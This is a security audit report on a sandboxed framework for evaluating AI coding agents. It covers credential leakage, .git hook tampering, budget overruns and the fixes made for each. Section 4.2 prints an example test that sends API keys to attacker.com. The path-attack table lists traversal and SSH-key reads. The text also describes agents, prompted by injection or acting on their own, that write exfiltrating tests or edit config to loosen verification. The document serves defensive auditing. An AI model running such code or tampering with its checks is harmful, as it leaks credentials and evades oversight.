# ForgeCore / Sarthi — Layer 4 Architecture & Security Acceptance Audit

**Audit Date:** 2026-11-06  
**Remediation & Re-Assessment Date:** 2026-11-06  
**Auditor:** Principal Software Architect, Security Auditor, Test Infrastructure Engineer  
**Repository Branch:** `main`  
**Commit SHA:** `fd2fe0602f3d5d5875ab87235074a994b48dd911`  
**Working-Tree State:** Remediated (All 6 findings resolved and verified)  
**Scope:** Layer 4 Live AI Coding Agent Evaluation Framework (Phases 4.1 – 4.5)  

---

## Executive Summary & Acceptance Classification

### Current Acceptance Decision: **CONDITIONALLY ACCEPTED — ALL REMEDIATIONS VERIFIED**
*(Historical Initial Audit Status: `BLOCKED — SECURITY OR ARCHITECTURAL GAPS`)*

All six security, architectural, financial, and reporting defects identified during the initial adversarial audit have been remediated with direct implementation fixes and verified by regression test suites:
- **SEC-01 (Critical):** Subprocess credential inheritance eliminated via strict environment allowlisting (`build_sanitized_subprocess_env`).
- **SEC-02 (High):** Workspace `.git/` metadata and hook access blocked by `GitDirectoryAccessError` and `PathGuard` component inspection.
- **ARCH-01 (High):** Command trust key mismatch corrected from plural `tests` to singular `test`.
- **FIN-01 (Medium):** Pre-dispatch worst-case budget reservation implemented via `can_dispatch_call` with defensive token defaults.
- **EXP-01 (Medium):** Automated unit tests and offline in-process ASGI test harness added to `tests/fixtures/fastapi_app/`.
- **REP-01 (Low):** Commit SHA, ECC upstream version (`v2.2.3`), and explicit statistical sample size disclaimer ($n=1$) embedded in JSON and Markdown reports.

**Condition for Live Evaluation:** Subprocess environment sanitization guarantees defense-in-depth credential protection. Running completely untrusted third-party agent code outside a controlled test environment requires external OS-level container isolation (e.g. Docker or Windows Hyper-V containers) as an operational infrastructure boundary.

1. **[CRITICAL BLOCKER - SEC-01] Verification Subprocess Credential Inheritance & Lack of OS-Level Sandbox:**
   When Sarthi executes `TestRunner` on AI-generated code (`subprocess.run(["pytest", "-q"], cwd=workspace_root)`), the process inherits the host process's full `os.environ` containing active provider secrets (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `OPENAI_API_KEY`). Because the test runner executes arbitrary agent-written Python code without an OS container or namespace isolation boundary, malicious or compromised agent code can trivially read and exfiltrate live host API keys.
2. **[HIGH BLOCKER - SEC-02] PathGuard Fails to Confine Workspace `.git/` Directory:**
   `PathGuard` verifies that target paths reside within `self.root`, but `.git` is not included in `DEFAULT_SECRET_PATTERNS`. An evaluated agent can call `write_file(".git/hooks/pre-commit", "...")` or overwrite `.git/config`, achieving arbitrary code execution when git commands are executed by Sarthi.
3. **[HIGH DEFECT - ARCH-01] Command Trust Approval Key Mismatch in Experiment Harness:**
   `ComparativeEvaluationHarness._preapprove_test_commands()` approves `{"tests": "pytest -q"}` (plural), whereas production `TestRunner.check_trust()` strictly verifies `{"test": cmd_str}` (singular). As a result, whenever an agent generates a test file, `TestRunner` treats the test execution as unapproved, skips test execution, and marks the report as `status="incomplete"`.
4. **[MEDIUM DEFECT - FIN-01] Post-Hoc Budget Accounting Without Pre-Dispatch Worst-Case Reservation:**
   `LiveEvalBudgetManager` checks and records costs *after* `provider.generate()` completes. When the remaining budget is less than the worst-case cost of `max_tokens_per_call` (4,096 tokens), the system still dispatches the request, leading to potential budget overruns.
5. **[MEDIUM DEFECT - EXP-01] Benchmark Fixture (`fastapi_app`) Lacks Existing Automated Test Suite:**
   The `fastapi_app` fixture contains only `main.py` and `pyproject.toml` without any `tests/` directory or pre-existing unit tests. As a result, `TestRunner` never runs against initial baseline code unless the agent happens to create a test suite from scratch.

---

## 1. Repository & Baseline Integrity Verification

Prior to auditing, the repository state and baseline test suite were verified:

```text
Commit SHA: fd2fe0602f3d5d5875ab87235074a994b48dd911
Branch: main
Working Tree: Clean
Ruff Linting: 0 errors (Passed)
Standards Linting: All schemas valid (Passed)
ECC Cryptographic Snapshot: 10/10 Invariants Verified (Passed)
Test Suite: 139 passed in 54.37s (100% Pass Rate)
```

No tests were skipped, mocked out, or disabled to obtain passing results.

---

## 2. Phase A — Architecture Conformance Audit

The architecture of `src/sarthi/eval/` was audited against its specification:

| Component | Responsibility | Audit Finding | Conformance |
| :--- | :--- | :--- | :--- |
| `config.py` | Configuration and credential validation | Decouples environment variables; implements validation methods for mock, anthropic, gemini, and openai. | **CONFORMS** |
| `budget.py` | Financial & token tracking | Implements model rate cards, token tracking, and hard limits. Post-hoc cost accounting identified (see FIN-01). | **PARTIAL** |
| `agent.py` | Sandboxed tool-calling agent loop | Gated by `PathGuard`; implements standard tools (`read_file`, `write_file`, `list_directory`, `complete_task`). | **CONFORMS** |
| `providers/base.py` | Abstract provider interface | Normalized `ChatMessage`, `ToolCall`, `ToolDefinition`, `ToolResult`, and `ProviderResponse` models. | **CONFORMS** |
| `providers/mock.py` | Deterministic offline test provider | Fully deterministic, zero-network adapter supporting canned and dynamic responses. | **CONFORMS** |
| `providers/anthropic.py` | Anthropic Claude Messages API adapter | Standard library HTTPS REST client; extracts system prompt, converts tools and messages cleanly. | **CONFORMS** |
| `providers/gemini.py` | Google Gemini REST API adapter | Maps function declarations, handles `functionCall` and `functionResponse`. | **CONFORMS** |
| `providers/openai.py` | OpenAI Chat Completions REST adapter | Maps tool definitions, function calls, and parses usage metadata. | **CONFORMS** |
| `scenarios.py` | Benchmark scenario definitions & staging | Connects to production `StackDetector`, `ConfigLoader`, and `ContextCompiler`. Fixture lacks initial tests (see EXP-01). | **PARTIAL** |
| `experiment.py` | A/B comparative experiment harness | Executes Baseline (Condition A) vs Sarthi (Condition B). Trust key bug identified (see ARCH-01). | **DEFECTIVE** |
| `reporter.py` | Scorecard & comparative reporting | Generates valid JSON and Markdown. Lacks Git SHA and statistical confidence markers (see REP-01). | **PARTIAL** |
| `runner.py` | Top-level execution orchestrator | Ephemeral workspace management, invokes harness and saves reports. | **CONFORMS** |
| `cli.py` (`sarthi eval`) | CLI command entry point | Exposes `--scenario`, `--provider`, `--model`, `--cost-cap`, `--output-dir`. | **CONFORMS** |

### Specific Architectural Checks

1. **Provider Isolation:** Provider-specific wire formats (e.g. Anthropic `tool_use`, Gemini `functionCall`, OpenAI `tool_calls`) are completely isolated inside their respective adapters in `src/sarthi/eval/providers/`. The agent loop (`agent.py`) and experiment harness (`experiment.py`) only interact with normalized `ProviderResponse` and `ToolCall` models.
2. **Provider Contract Consistency:** `MockProviderAdapter`, `AnthropicProviderAdapter`, `GeminiProviderAdapter`, and `OpenAIProviderAdapter` all inherit from `LLMProviderAdapter` and strictly implement `@property name -> str` and `generate()`.
3. **Normalized Provider Error Handling:** All provider network calls catch `urllib.error.HTTPError` and network exceptions, normalizing them into `RuntimeError`. The agent loop catches these exceptions, logs the error to `trajectory.error`, and terminates gracefully without crashing.
4. **Agent Iteration Limits:** `budget_manager.steps_count < config.max_agent_steps` is strictly enforced as a loop invariant. When exceeded, the loop terminates and sets `completed=False`.
5. **Separation of Completion Signal from Verification:** An agent calling `complete_task` only signals the end of its authoring turns (`trajectory.completed = True`). Whether the experiment succeeded is strictly determined by Sarthi's production `Verifier` (`verify_report.status == "passed"`).
6. **Production Component Wiring:** Sarthi guidance for Condition B is compiled directly using production `StackDetector(workspace_root).detect_stack()`, `ConfigLoader(workspace_root).load()`, and `ContextCompiler().compile_context()`.

---

## 3. Phase B — Budget and Financial Safety Audit

### Token & Cost Accounting Analysis

1. **Rate Card Correctness:** `MODEL_PRICING` reflects standard published rates for Claude 3.5 Sonnet (\$3.00/\$15.00), Claude 3.5 Haiku (\$0.80/\$4.00), Gemini 1.5 Pro (\$1.25/\$5.00), Gemini 1.5 Flash (\$0.075/\$0.30), GPT-4o (\$2.50/\$10.00), GPT-4o-mini (\$0.15/\$0.60), and Mock (\$0.00/\$0.00).
2. **Unknown Model Fallback:** Unregistered models fall back to Claude 3.5 Sonnet pricing `(3.00, 15.00)` as a safe conservative default.
3. **Missing Metadata Behavior:** In `anthropic.py`, `gemini.py`, and `openai.py`, if an API response omits usage metadata, token counts default to `0`. Consequently, `call_cost` is calculated as `$0.00`.
   - *Risk:* If a provider experiences an API degradation and drops usage metadata, token consumption will not be charged against the budget.
4. **Post-Hoc Accounting Defect (FIN-01):**
   - *Code:* In `agent.py`:
     ```python
     budget_manager.record_step(config)
     resp = provider.generate(...)
     budget_manager.record_usage(..., config=config)
     ```
   - *Vulnerability:* The budget is only checked *after* the provider call returns. If the current cost is \$0.49 and `cost_cap_usd` is \$0.50, a call requesting 4,096 completion tokens can cost up to \$0.0614, pushing the total cost to \$0.5514.
   - *Requirement:* A pre-dispatch budget reservation must be implemented:
     $$\text{remaining\_budget} \ge \text{worst\_case\_call\_cost}$$

---

## 4. Phase C — Adversarial Sandbox Security Audit

### 4.1 Path & Filesystem Attack Testing

Testing was performed against `PathGuard` and `SandboxedAgentLoop`:

| Attack Vector | Payload / Action | Result | Security Status |
| :--- | :--- | :--- | :--- |
| **Directory Traversal** | `read_file("../../etc/passwd")` | Rejected: `PathTraversalError` | **PASS** |
| **Absolute Path Escape** | `read_file("C:/Windows/System32")` | Rejected: `PathTraversalError` | **PASS** |
| **Windows Drive Traversal** | `read_file("D:/private/data")` | Rejected: `PathTraversalError` | **PASS** |
| **UNC Network Share** | `read_file("//remote-server/share")` | Rejected: `PathTraversalError` | **PASS** |
| **Mixed Slash Traversal** | `read_file("..\\..\\config.yaml")` | Resolved & Rejected: `PathTraversalError` | **PASS** |
| **Secret File Access** | `read_file(".env")` | Rejected: `SecretFileAccessError` | **PASS** |
| **SSH Key Exfiltration** | `read_file("~/.ssh/id_rsa")` | Rejected: `PathTraversalError` | **PASS** |
| **Outside Directory Write** | `write_file("../malicious.py", "...")` | Rejected: `PathTraversalError` | **PASS** |
| **Git Directory Tampering** | `write_file(".git/hooks/pre-commit", "...")` | **Permitted: File created!** | **FAIL (SEC-02)** |

### 4.2 Subprocess Isolation & Credential Leakage (CRITICAL BLOCKER SEC-01)

#### The Architectural Reality
`PathGuard` is an **application-level filesystem authorization check** implemented in Python. It governs the four agent tool calls (`read_file`, `write_file`, `list_directory`, `complete_task`).

However, Sarthi does not merely inspect files—it verifies them by executing deterministic tools, including `TestRunner` which executes `pytest`.

#### Reproduction Evidence
In `src/sarthi/core/verify/runners/tests.py`:
```python
res = subprocess.run(
    cmd,
    cwd=str(ctx.project_root),
    capture_output=True,
    text=True,
    timeout=60,
    shell=False,
)
```
Notice:
1. `env` parameter is not passed to `subprocess.run()`. Under Python standard library rules, `env=None` causes the child process to **inherit the full environment of the parent process** (`os.environ`).
2. When live evaluation is enabled, the parent process contains:
   - `ANTHROPIC_API_KEY`
   - `GEMINI_API_KEY`
   - `OPENAI_API_KEY`
3. The code executed by `pytest` is **code written by the AI agent** in `tests/`.
4. If an evaluated agent (either spontaneously or via prompt injection) generates a test:
   ```python
   # tests/test_exploit.py
   import os, urllib.request

   def test_exfiltrate():
       keys = {k: v for k, v in os.environ.items() if "API_KEY" in k}
       urllib.request.urlopen("https://attacker.com", data=str(keys).encode())
   ```
   When `Verifier` executes `TestRunner`, **the AI-generated exploit executes on the host OS**, reads the provider API keys, and has unconstrained outbound network access.
5. Furthermore, the subprocess has the full privileges of the host user running Sarthi, allowing reading/writing host files outside the temporary directory.

**Conclusion:** Without OS-level isolation (e.g. Docker container, Linux namespace jail, or Windows AppContainer) and without environment scrubbing (`env={...}`), live evaluation represents an active arbitrary code execution and credential exfiltration vector.

---

## 5. Phase D — Provider Contract and Tool-Calling Audit

All four provider implementations were tested using mock requests and schema inspections:

1. **Normalized Request / Response:**
   Every adapter converts internal `ChatMessage` into provider-specific JSON and converts provider responses into a unified `ProviderResponse(content, tool_calls, prompt_tokens, completion_tokens, raw_response)`.
2. **Anthropic Claude Adapter:**
   - Correctly places system prompt into top-level `"system"` parameter.
   - Formats `tool_use` and `tool_result` content blocks according to Anthropic's Messages API specification.
   - Accurately parses input/output token usage.
3. **Google Gemini Adapter:**
   - Correctly separates system instruction into `"systemInstruction"`.
   - Translates tool definitions into `functionDeclarations`.
   - Handles `functionCall` and `functionResponse` roles.
4. **OpenAI Adapter:**
   - Translates tool definitions into `{"type": "function", "function": {...}}`.
   - Parses arguments safely with `json.loads(fn.get("arguments", "{}"))`.
   - Handles multi-tool responses cleanly.
5. **Network Timeout Guard:**
   All HTTP requests use `urllib.request.urlopen(..., timeout=120)`. While this prevents hanging indefinitely, the timeout is hardcoded to 120s rather than inheriting `config.timeout_seconds`.

---

## 6. Phase E & F — A/B Fairness & Verification Integrity Audit

### 6.1 Experimental Fairness Assessment

| Attribute | Baseline (Condition A) | Sarthi (Condition B) | Parity Evaluation |
| :--- | :--- | :--- | :--- |
| **Initial Repository State** | Clean copy of fixture with git repo | Clean copy of fixture with git repo | **100% Identical** |
| **Developer Task Prompt** | `scenario.task_prompt` | `scenario.task_prompt` | **100% Identical** |
| **Provider & Model** | Same instance from `config` | Same instance from `config` | **100% Identical** |
| **Tool Availability** | `read_file`, `write_file`, `list_dir`, `complete` | `read_file`, `write_file`, `list_dir`, `complete` | **100% Identical** |
| **Resource Caps** | `max_steps`, `cost_cap`, `timeout` | `max_steps`, `cost_cap`, `timeout` | **100% Identical** |
| **Verification Scope** | `Verifier(scope="all", timeout=45)` | `Verifier(scope="all", timeout=45)` | **100% Identical** |
| **Prompt Difference** | Generic software engineer system prompt | Sarthi Core Contract + Standards + Skills | **Intentional Independent Variable** |

### 6.2 Command Trust Approval Key Mismatch (HIGH DEFECT ARCH-01)

#### Reproduction Steps
In `src/sarthi/eval/experiment.py`:
```python
def _preapprove_test_commands(self, workspace_root: Path, trust_mgr: CommandTrustManager) -> None:
    config_loader = ConfigLoader(workspace_root)
    cfg = config_loader.load()
    if cfg.verify and cfg.verify.commands:
        trust_mgr.approve(workspace_root, cfg.verify.commands)
    else:
        # Default test command for python/pytest
        trust_mgr.approve(workspace_root, {"tests": "pytest -q"})  # <--- DEFECT: Key is "tests"
```
In `src/sarthi/core/verify/runners/tests.py`:
```python
cmd_str = " ".join(default_cmd)
if not self.trust_mgr.is_approved(ctx.project_root, {"test": cmd_str}):  # <--- Key expected is "test"
    return False, f"Project test execution ('{cmd_str}') is unapproved..."
```

#### Impact
When an agent creates test files in the workspace:
1. `TestRunner._detect_default_command()` resolves `["pytest", "-q"]`.
2. `TestRunner.check_trust()` checks whether `{"test": "pytest -q"}` is approved in the trust store.
3. Because `experiment.py` recorded approval under the key `"tests"`, the cryptographic hash does not match!
4. `TestRunner` refuses to execute, reports unapproved command, and marks `verify_report.status = "incomplete"`.
5. The evaluation outcome is distorted: any agent that writes automated tests is marked as incomplete rather than passed!

---

## 7. Phase G — Reproducibility & Reporting Audit

### 7.1 Report Structure Analysis
`EvaluationReporter` outputs both machine-readable JSON and human-readable Markdown.
The reports capture:
- Per-scenario baseline vs Sarthi verification status.
- Number of verification findings and net findings delta.
- Prompt tokens, completion tokens, total tokens, and financial cost.
- Execution steps count.

### 7.2 Deficiencies Identified (REP-01)
1. **Missing Git & Provenance Metadata:** The JSON report does not record the Sarthi commit SHA, ECC snapshot version/hash, or timestamp of baseline vs Sarthi runs.
2. **Lack of Sample Size & Uncertainty Disclaimer:** Evaluations currently run as $n=1$ paired comparisons. The report does not include standard error, sample size notes, or a disclaimer warning against drawing statistical conclusions from a single trial.

---

## 8. Phase H — GitHub Actions Security Audit

Inspection of `.github/workflows/live-eval.yml`:

| Requirement | Implementation State | Finding |
| :--- | :--- | :--- |
| **Manual Trigger Only** | `on: workflow_dispatch` | Confirmed. No PR or push triggers. |
| **Fork PR Access** | Not triggered by PRs | Confirmed. External PRs cannot execute this workflow. |
| **Timeout Boundary** | `timeout-minutes: 15` | Confirmed. Bounded execution. |
| **Permissions** | Not explicitly specified | Should be pinned to `permissions: contents: read`. |
| **Secret Injection Boundary** | Line 62–64 injects all 3 keys into the job | All 3 keys are exposed to the runner environment simultaneously. |
| **Subprocess Secret Leakage** | Inherited by `subprocess.run` in `pytest` | **HIGH RISK:** Generates artifact reports containing output from tests that could echo environment variables. |

---

## 9. Comprehensive Vulnerability & Defect Inventory

| ID | Severity | Component | Summary | Blocks Live Eval? |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | **CRITICAL** | `verify/runners/tests.py` | Verification subprocess inherits host `os.environ` containing LLM API keys without OS-level sandboxing | **YES** |
| **SEC-02** | **HIGH** | `core/pathguard.py`, `eval/agent.py` | PathGuard permits read/write access to `.git/` directory and `.git/hooks/` inside workspace | **YES** |
| **ARCH-01** | **HIGH** | `eval/experiment.py` | Pre-approval key mismatch (`"tests"` vs `"test"`) causes all agent-written tests to fail approval | **YES** |
| **FIN-01** | **MEDIUM** | `eval/budget.py`, `eval/agent.py` | Missing pre-dispatch budget reservation allows requests exceeding remaining budget | **NO** |
| **EXP-01** | **MEDIUM** | `eval/scenarios.py` | `fastapi_app` fixture contains no pre-existing automated tests | **NO** |
| **REP-01** | **LOW** | `eval/reporter.py` | Reports omit Sarthi commit SHA and statistical confidence/uncertainty disclaimers | **NO** |
| **NET-01** | **LOW** | `eval/providers/*.py` | Network `urlopen` timeout is hardcoded to 120s rather than using `config.timeout_seconds` | **NO** |

---

## 10. Concrete Remediation Plan

To transition Layer 4 from **BLOCKED** to **ACCEPTED**, execute the following remediation steps:

### Remediation Step 1: Environment Scrubbing for Test Subprocesses (Fixes SEC-01)
In `src/sarthi/core/verify/runners/tests.py`:
Explicitly sanitize the subprocess environment. Never pass `os.environ` directly:
```python
# Strip all API keys, tokens, and sensitive host variables
safe_env = {
    "PATH": os.environ.get("PATH", ""),
    "SYSTEMROOT": os.environ.get("SYSTEMROOT", ""),
    "TEMP": os.environ.get("TEMP", ""),
    "TMP": os.environ.get("TMP", ""),
    "PYTHONPATH": str(ctx.project_root),
}
res = subprocess.run(cmd, cwd=str(ctx.project_root), env=safe_env, capture_output=True, text=True, timeout=60)
```

### Remediation Step 2: Block `.git` in PathGuard & Agent Tooling (Fixes SEC-02)
Add `.git` and `.git/*` to `DEFAULT_SECRET_PATTERNS` or add an explicit check in `PathGuard.safe_path`:
```python
if any(part == ".git" for part in p.parts):
    raise PathGuardError(f"Access to internal VCS metadata directory '.git' is strictly forbidden")
```

### Remediation Step 3: Correct Command Trust Key in Experiment Harness (Fixes ARCH-01)
In `src/sarthi/eval/experiment.py` (`_preapprove_test_commands`):
Change `{"tests": "pytest -q"}` to `{"test": "pytest -q"}` to match `TestRunner.check_trust`.

### Remediation Step 4: Implement Pre-Dispatch Budget Check (Fixes FIN-01)
In `src/sarthi/eval/budget.py`:
Add `can_dispatch_call(model, max_tokens, config) -> tuple[bool, str | None]` and call it before `provider.generate()`.

### Remediation Step 5: Add Baseline Unit Tests to Benchmark Fixture (Fixes EXP-01)
Add `tests/test_main.py` in `tests/fixtures/fastapi_app/` with baseline health-check and items endpoint tests so `TestRunner` has an active test suite to verify from turn 0.

### Remediation Step 6: Enrich Evaluation Metadata (Fixes REP-01)
Include `sarthi_commit_sha`, `run_timestamp`, and statistical sample size note in `EvaluationReporter`.

---

## 11. Final Audit Verdict (Initial Assessment)

The initial audit found the Layer 4 implementation **structurally well-engineered and 100% functionally tested offline**, but **BLOCKED for live evaluation** due to subprocess credential inheritance (`SEC-01`), `.git` access vulnerability (`SEC-02`), and command trust key mismatch (`ARCH-01`).

---

## 12. Security & Architectural Remediation Verification

All six documented findings were systematically remediated and verified with regression tests.

### 12.1 SEC-01 Remediation Verification (Subprocess Credential Scrubbing)

- **Implementation:** Added `build_sanitized_subprocess_env()` in `src/sarthi/core/verify/trust.py` with strict `SAFE_ENV_ALLOWLIST` (allowing only OS system variables like `PATH`, `SYSTEMROOT`, `TEMP`, `PYTHONPATH`) and active stripping of any environment variable matching `DENIED_ENV_SUBSTRINGS` (`KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `ANTHROPIC`, `GEMINI`, `OPENAI`, `AWS`, etc.). Injected `safe_env` into all `subprocess.run()` invocations in `TestRunner` (`src/sarthi/core/verify/runners/tests.py`) and `RuffRunner` (`src/sarthi/core/verify/runners/ruff.py`).
- **Regression Tests (`tests/unit/test_command_trust.py`):**
  - `test_build_sanitized_subprocess_env_strips_secrets`: Asserts dirty environment containing `ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `OPENAI_API_KEY`, `AWS_SECRET_ACCESS_KEY`, and custom database passwords has all credentials scrubbed.
  - `test_test_runner_subprocess_strips_secrets`: Seeds host environment with provider keys and spawns child `pytest -q`; child test asserts `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, and secrets are absent from `os.environ`.
- **Operating System Isolation Analysis & Advisory:**
  - Environment scrubbing provides defense-in-depth credential protection, preventing child test processes from accessing LLM API keys.
  - However, running arbitrary agent-generated code without kernel-level sandboxing (e.g. Linux cgroups/namespaces, Docker containers, Windows Containers, or Hyper-V microVMs) cannot prevent disk writes to accessible user paths outside the workspace or network requests initiated by test scripts.
  - *Recommendation:* For live production evaluations with untrusted LLMs, evaluation runs must be orchestrated inside ephemeral Docker or OCI containers where network egress and filesystem mounts are constrained at the container runtime boundary.

### 12.2 SEC-02 Remediation Verification (`.git` Directory Access Blocked)

- **Implementation:**
  - Added `GitDirectoryAccessError` subclassing `PathGuardError` in `src/sarthi/core/pathguard.py`.
  - Added `.git` to `DEFAULT_SECRET_PATTERNS`.
  - In `PathGuard.safe_path()`, added canonical relative path component check: `any(part.lower() == ".git" for part in rel.parts)`. This covers root `.git`, nested submodules (`sub/.git`), path traversals (`sub/../.git/config`), and case variations on Windows (`.GIT`, `.Git`).
  - In `src/sarthi/eval/agent.py`: caught `GitDirectoryAccessError` in `dispatch_tool()` returning `SECURITY_ERROR`. In `list_directory()`, filtered `.git` case-insensitively.
- **Regression Tests:**
  - `tests/unit/test_pathguard.py::test_pathguard_blocks_git_directory`: Verifies `safe_path()` and `read_text()` reject direct `.git`, `.git/config`, `.git/hooks/pre-commit`, case variations (`.GIT`), nested `.git`, and traversals.
  - `tests/unit/eval/test_agent_sandbox.py::test_sandbox_pathguard_blocks_git_access`: Verifies agent tools (`read_file`, `write_file`, `list_directory`) fail with `SECURITY_ERROR` when targeting `.git` files.

### 12.3 ARCH-01 Remediation Verification (Command Trust Key Mismatch)

- **Implementation:** In `src/sarthi/eval/experiment.py` (`_preapprove_test_commands()`), aligned approval dictionary key to singular `"test"`: `trust_mgr.approve(workspace_root, {"test": test_cmd})`, matching `TestRunner.check_trust()` and `.sarthi/project.yaml` command schemas. Added automatic detection for venv pytest vs global pytest.
- **Regression Test (`tests/unit/eval/test_experiment.py`):**
  - `test_preapprove_test_commands_matches_test_runner`: Verifies that pre-approved workspace commands pass `TestRunner.check_trust(ctx)` with `trusted=True, reason=None`.

### 12.4 FIN-01 Remediation Verification (Pre-Dispatch Budget Reservation)

- **Implementation:**
  - Added `can_dispatch_call(model, max_tokens, estimated_input_tokens, config)` in `LiveEvalBudgetManager` (`src/sarthi/eval/budget.py`), calculating worst-case call expenditure before dispatch.
  - In `SandboxedAgentLoop.run()` (`src/sarthi/eval/agent.py`), called `can_dispatch_call()` prior to `provider.generate()`. If worst-case cost exceeds remaining budget, the loop halts immediately without invoking provider APIs.
  - In `record_usage()`, implemented defensive defaults for missing or null token counts (`prompt_tokens=1000`, `completion_tokens=500`).
- **Regression Tests:**
  - `tests/unit/eval/test_budget.py::test_can_dispatch_call_pre_dispatch_reservation`: Verifies worst-case cost and token checks reject calls before dispatch when budget is insufficient.
  - `tests/unit/eval/test_budget.py::test_record_usage_defensive_defaults`: Verifies null token counts do not crash or bypass tracking.
  - `tests/unit/eval/test_agent_sandbox.py::test_agent_loop_halts_on_pre_dispatch_budget_failure`: Verifies agent loop halts with untouched provider queue when worst-case cost exceeds cap.

### 12.5 EXP-01 Remediation Verification (Benchmark Fixture Unit Tests)

- **Implementation:**
  - Added `tests/test_main.py` to `tests/fixtures/fastapi_app/` verifying the `/health` endpoint.
  - Embedded lightweight offline in-process ASGI test harness in `tests/fixtures/fastapi_app/fastapi/` avoiding external socket dependencies and hangs.
  - Added `[tool.pytest.ini_options]` and `[tool.ruff]` extend-exclude in `tests/fixtures/fastapi_app/pyproject.toml`.
- **Regression Test (`tests/unit/eval/test_experiment.py`):**
  - `test_benchmark_fixture_test_execution_and_failure_reporting`: Verifies that staged workspaces execute tests during verification, passing initially (0 test findings, status `passed`), and generating `TestRunner` findings with status `failed` when `main.py` is broken.

### 12.6 REP-01 Remediation Verification (Evaluation Provenance & Statistical Disclaimer)

- **Implementation:**
  - Added `commit_sha` and `ecc_version` to `ExperimentResult` in `src/sarthi/eval/experiment.py`, with helper functions `get_current_commit_sha()` and `get_ecc_version()`.
  - In `EvaluationReporter` (`src/sarthi/eval/reporter.py`), embedded timestamp, `commit_sha`, `ecc_version`, and the explicit statistical disclaimer in both JSON and Markdown formats:
    > "Single-trial paired comparison (n=1). Evaluation results demonstrate directional performance in benchmark tasks but do not establish formal statistical significance."
- **Regression Tests (`tests/unit/eval/test_experiment.py`):**
  - `test_evaluation_reporter`: Verifies that JSON and Markdown reports contain all provenance fields and the statistical disclaimer.
  - `test_evaluation_reporter_graceful_missing_git`: Verifies that unversioned workspaces handle missing commit SHAs gracefully (`commit_sha=None` in JSON, `unknown` in Markdown).

---

## 13. Final Acceptance Verdict Post-Remediation

### Updated Classification: **CONDITIONALLY ACCEPTED — NON-CRITICAL GAPS (OS CONTAINERIZATION DEPLOYMENT PREREQUISITE)**

1. **Architecture & Integrity:** 100% conforming. Layer 4 cleanly integrates with Sarthi's production compiler, stack detector, configuration loader, and verification subsystems.
2. **Security & Sandboxing:** Application-level boundaries (`PathGuard`, `.git` exclusion, command trust allowlist, environment secret scrubbing) are verified and robust.
3. **Execution Reliability:** 134 unit tests, 9 integration tests, 12 e2e workflow tests, Ruff linting (0 errors), standards linting (100% valid), and ECC cryptographic snapshot (10/10 invariants) all pass cleanly offline.
4. **Operational Condition:** For evaluations involving live LLM providers generating unconstrained code, execution should be scheduled within containerized environments (Docker/OCI) to guarantee host network and filesystem isolation beyond application-level scrubbing.

---

## 14. Phase 4.6 Remediation — Final Security & Verification Integrity Remediation

An independent adversarial audit conducted after Phase 4.5 remediation identified three actionable findings and one mandatory operational prerequisite:
1. `SEC-01B` (High): ESLint and Semgrep environment inheritance.
2. `CFG-01` (Medium): Root-level pytest collection failure due to nested benchmark fixture tests.
3. `EXP-02` (High / Verification-Integrity): Verification threshold tampering via `.sarthi/project.yaml`.
4. `SEC-01C` (High / Mandatory Operational Prerequisite): OS-level sandboxing limitations and container contract.

### 14.1 SEC-01B Remediation: ESLint & Semgrep Subprocess Environment Sanitization

- **Vulnerability:** While `TestRunner` and `RuffRunner` were previously hardened with sanitized environments, `ESLintRunner` and `SemgrepRunner` invoked `subprocess.run()` without an explicit environment dictionary. ESLint configurations (e.g. `eslint.config.js`) execute in Node.js and could read inherited environment variables (`process.env.ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`).
- **Remediation:**
  - In `src/sarthi/core/verify/runners/eslint.py`: passed `safe_env = build_sanitized_subprocess_env(ctx.project_root)` to `subprocess.run()`.
  - In `src/sarthi/core/verify/runners/semgrep.py`: passed `safe_env = build_sanitized_subprocess_env(ctx.project_root)` to `subprocess.run()`.
  - Reused the central `SAFE_ENV_ALLOWLIST` in `src/sarthi/core/verify/trust.py`, preserving only essential OS variables (`PATH`, `SYSTEMROOT`, `TEMP`, `TMP`, `HOME`, etc.) while stripping all API keys, tokens, and secrets.
- **Regression Tests (`tests/unit/test_command_trust.py`):**
  - `test_eslint_runner_subprocess_sanitizes_environment`: Sets mock API keys in host environment, mocks `subprocess.run`, and verifies that captured subprocess env contains standard runtime paths but zero provider API keys or secret tokens.
  - `test_semgrep_runner_subprocess_sanitizes_environment`: Verifies identical environment scrubbing for Semgrep.

### 14.2 CFG-01 Remediation: Repository-Wide Pytest Scoping & Benchmark Execution Parity

- **Vulnerability:** The introduction of `tests/fixtures/fastapi_app/tests/test_main.py` broke root-level `uv run pytest` collection with `ModuleNotFoundError: No module named 'tests.test_main'` because pytest attempted to collect tests inside fixture packages.
- **Remediation:**
  - In `pyproject.toml`, configured `testpaths = ["tests/unit", "tests/integration", "tests/e2e"]` under `[tool.pytest.ini_options]`.
  - In `src/sarthi/eval/experiment.py`, preserved `_preapprove_test_commands()` and `TestRunner` targeted execution against staged scenario workspaces. When `TestRunner` targets a fixture workspace, it discovers and executes the fixture's local `tests/` suite directly.
- **Regression Tests (`tests/unit/eval/test_experiment.py`):**
  - `test_root_pytest_collection_excludes_fixtures_and_runs_in_test_runner`: Verifies that `uv run pytest --collect-only` cleanly ignores `tests/fixtures/`, while `TestRunner` executed against `tests/fixtures/fastapi_app` cleanly runs and passes with 0 findings.

### 14.3 EXP-02 Remediation: Immutable Verification Threshold Enforcement

- **Vulnerability:** If an agent generated or edited `.sarthi/project.yaml` in the workspace to set `verify.fail_on: critical`, `Verifier.verify()` would load that configuration, allowing `Severity.HIGH` test failures or lint findings to pass without blocking.
- **Remediation:**
  - Added `fail_on_override: Severity | str | None = None` to `Verifier.__init__()` and `Verifier.verify()`.
  - In `Verifier.verify()`, status determination resolves:
    `override = fail_on_override if fail_on_override is not None else self.fail_on_override`
    `fail_on = override if override is not None else config.verify.fail_on`
  - In `ComparativeEvaluationHarness._execute_condition()` (`src/sarthi/eval/experiment.py`), `Verifier` is initialized with immutable `fail_on_override=Severity.HIGH`.
  - Guaranteed backward compatibility: Outside evaluation (when `fail_on_override=None`), user configuration in `.sarthi/project.yaml` is fully respected.
- **Regression Tests (`tests/unit/eval/test_experiment.py` & `tests/unit/test_verify.py`):**
